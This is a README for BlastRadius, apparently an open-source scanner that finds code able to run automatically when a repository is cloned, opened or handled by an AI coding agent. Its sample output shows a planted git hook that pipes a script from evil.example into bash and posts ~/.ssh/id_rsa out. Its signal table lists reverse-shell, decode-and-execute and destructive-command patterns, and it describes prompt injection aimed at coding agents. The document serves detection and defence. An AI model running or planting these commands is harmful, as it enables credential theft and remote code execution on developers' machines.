# BlastRadius

**Find every place an AI agent — or the repo itself — can run code without your explicit approval.**

You point an AI coding agent (Claude Code, Cursor, Codex, aider…) at a repo, or you `git clone` something and open it. Before you type a single command, code can already run: a `.git/hooks/pre-commit`, an `npm postinstall`, a `.envrc`, a VS Code task set to `folderOpen`, a `.claude/settings.json` that pre-approves `Bash(*)`, a `CLAUDE.md` that tells the agent to `curl … | bash`. None of it shows up in a normal diff review.

BlastRadius statically scans a repository for these **auto-execution points**, shows you the actual code, explains what triggers it, and ranks each by **blast radius** — how bad it gets if it fires.

```
$ blastradius .

Blast radius: 🔴 3 CRITICAL   🟠 2 HIGH   🟡 4 MEDIUM

🔴 CRITICAL  Git hook runs on git operations  [git-native-hook]
   file     .git/hooks/pre-commit
   trigger  git commit / checkout / push / merge (also fires when an agent runs git)
   risk     Files in .git/hooks execute automatically on ordinary git commands…
   escalated HIGH → CRITICAL by code behaviour
   signals  Pipe network download straight into a shell (+5), Reads credentials (+4), Exfiltrates data (+4)
   code
   │ #!/bin/sh
   │ curl -s https://evil.example/x.sh | bash
   │ cat ~/.ssh/id_rsa | curl -X POST --data @- https://evil.example/k
   fix      Inspect .git/hooks/*; remove or empty unexpected hooks…
```

## Why this exists

Two things happened at once: (1) coding agents now run shell on your machine dozens of times a session, and (2) "just clone it and let the agent figure it out" became a normal workflow. That turns every dormant auto-run hook — the ones the security world has known about for years — into something an agent will cheerfully trigger for you. There are good tools for *runtime* agent authorization (approve-this-command gateways). There was nothing that answers the question **"what in this repo can run before I approve anything?"** BlastRadius is that pre-flight scan.

## Install

```bash
pip install blastradius-scan      # ships zero dependencies — stdlib only, easy to vendor & audit
```

Or run from source with no install: `python -m blastradius <path>`.

## Usage

```bash
blastradius .                       # scan the current repo, pretty terminal report
blastradius ~/downloads/some-repo   # scan before you open an untrusted clone
blastradius . -f json               # machine-readable
blastradius . -f sarif > br.sarif   # upload to GitHub code scanning
blastradius . -f markdown           # drop into a PR comment / CI summary
blastradius . -f html > report.html # self-contained shareable dashboard
blastradius . --include-home        # also scan ~/.gitconfig, ~/.claude, ~/.npmrc, ~/.ssh/config …
blastradius . --min-severity high   # only show high+critical
blastradius . -q --fail-on high     # no output, just exit 1 if anything high+ (CI gate)
```

Exit code is `0` unless a finding meets `--fail-on` (default `high`), so it drops into CI as a gate.

### Gate on *new* auto-run points only (baseline)

Accept the auto-run points you've already reviewed, then fail CI only when someone introduces a new one — no server, no account:

```bash
blastradius . --write-baseline .blastradius-baseline.json   # once, commit this file
blastradius . --baseline .blastradius-baseline.json --fail-on medium   # in CI: only NEW findings count
```

Baseline entries are fingerprinted by vector + path + the flagged code, so they keep holding across re-runs and line moves.

### Policy & custom rules (`.blastradius.json`)

Drop a `.blastradius.json` in your repo root (auto-loaded) to encode team policy in-repo — which vectors to ignore, per-vector severity, path excludes, default gate, and your own regex detectors. See [`.blastradius.example.json`](.blastradius.example.json):

```json
{
  "exclude": ["vendor"],
  "ignore_vectors": ["go-generate"],
  "severity_overrides": { "npm-lifecycle-script": "high" },
  "fail_on": "high",
  "custom_rules": [
    { "id": "internal-deploy", "files": ["*.sh"], "pattern": "kubectl apply|terraform apply",
      "severity": "high", "danger": "Mutates prod infra." }
  ]
}
```

### CI gate (GitHub Actions)

```yaml
- name: BlastRadius pre-flight
  run: |
    pip install blastradius-scan
    blastradius . -f sarif > blastradius.sarif
    blastradius . --fail-on high        # fails the job on high/critical
- uses: github/codeql-action/upload-sarif@v3
  with: { sarif_file: blastradius.sarif }
```

## How the risk engine works

A vector has a **base severity** just for existing (a `postinstall` script is inherently worth a look). What makes it *dangerous* is what the code inside actually does. BlastRadius greps every auto-run file for **amplifier signals** and escalates:

| Signal | Weight | Example |
|---|---|---|
| Pipe download into a shell | 5 | `curl … \| bash` |
| Base64/hex decode then execute | 5 | `echo … \| base64 -d \| sh` |
| Reverse / bind shell | 5 | `bash -i >& /dev/tcp/…` |
| Reads credentials / secrets | 4 | `~/.ssh/id_rsa`, `_authToken`, `env` dump |
| Installs persistence | 4 | `crontab`, `authorized_keys`, rc-file write |
| Exfiltrates data | 4 | `curl --data @file https://…` |
| Destructive op | 4 | `rm -rf /`, `dd of=/dev/…` |
| Dynamic eval / obfuscation / disable-logging / privilege / egress | 1–3 | … |

A benign `"postinstall": "echo thanks"` stays MEDIUM. The same slot with `base64 -d | sh` becomes CRITICAL. **That separation — signal from noise — is the whole point;** a scanner that flags every `postinstall` as high just trains you to ignore it.

## Coverage

39 detectors across the ecosystems an agent actually touches:

- **git** — native hooks, `core.hooksPath`, husky, pre-commit/lefthook, `.gitattributes` filter/diff/merge drivers, `credential.helper` command, alias shell-escape, `include`/`includeIf`, `core.fsmonitor`, `core.sshCommand`, submodule `ext::` transport RCE, pager/editor hijack
- **node** — install lifecycle scripts (pre/post/install/prepare), `.pnpmfile.cjs`, `.npmrc` (auth/registry/script), `binding.gyp` native builds, JS toolchain config-as-code (vite/webpack/jest/eslint…), Bun/Deno runtime hooks
- **python** — `setup.py`, `conftest.py`, `sitecustomize`/`usercustomize`/`.pth`, `tox`/`nox`
- **editor** — VS Code `folderOpen` tasks, settings env/code-runner, `launch.json`, devcontainer lifecycle commands, JetBrains run configs, Emacs `.dir-locals.el`, Vim project rc, `.gdbinit`/`.lldbinit`
- **agent** — Claude Code `permissions.allow`/hooks, MCP server auto-launch, prompt-injection in agent-read files (`CLAUDE.md`, `.cursorrules`, copilot-instructions, aider)
- **shell** — `.envrc` (direnv), `.env*` code-loader vars, SSH config `ProxyCommand`, dropped rc/service/cron fragments
- **ci** — GitHub Actions `pull_request_target` + script injection, task-runner default targets
- **supply-chain** — package index/registry redirects (pip/cargo)
- **lang** — Rust `build.rs`, Ruby `Gemfile`/`Rakefile`, PHP Composer scripts, Go `//go:generate`, R `.Rprofile`

**The amplifier engine** (16 signals) is what separates a benign auto-run point from a
weaponised one: pipe-to-shell, decode-then-exec, reverse shell, credential access,
persistence, exfiltration, env-var code loaders (`NODE_OPTIONS`/`BASH_ENV`/`LD_PRELOAD`),
hidden/bidi Unicode (Trojan Source), obfuscation, and more.

Output formats: `terminal`, `json`, `sarif` (2.1.0), `markdown`, `html`.

## Try it

```bash
python fixtures/_gen.py                    # writes a repo full of planted traps
blastradius fixtures/malicious-repo        # watch it light up
blastradius fixtures/clean-repo            # …and stay quiet on a clean one
```

## Tests

```bash
python -m unittest discover -s tests       # or: pytest
```

## Status & roadmap

Everything above works today: 39 detectors, the amplifier risk engine, five output formats, baseline gating, `.blastradius.json` policy + custom rules, and `--include-home`. Next up: more detectors from the threat catalog (terraform, ansible, MSBuild, Jupyter, conda…) and richer path-scoped policy. Contributions and new vector reports welcome — open an issue with a repo shape that should have been flagged.

## Support

BlastRadius is free, open source, and zero-dependency, and it stays that way. There's no paid tier and no telemetry — it's funded entirely by people who find it useful. If it caught something nasty, or saved you a bad afternoon, you can chip in:

- **GitHub Sponsors** — see the **Sponsor** button at the top of the repo
- **Buy Me a Coffee** — coming soon
- **爱发电 (afdian)** — convenient for mainland China users

### For companies & teams

Sponsor BlastRadius and get your logo + link featured here and in the repo. Reach out: **[fxy1744000@outlook.com](mailto:fxy1744000@outlook.com)**.

Every contribution funds new detectors and keeps the threat catalog current.

## License

Apache-2.0.
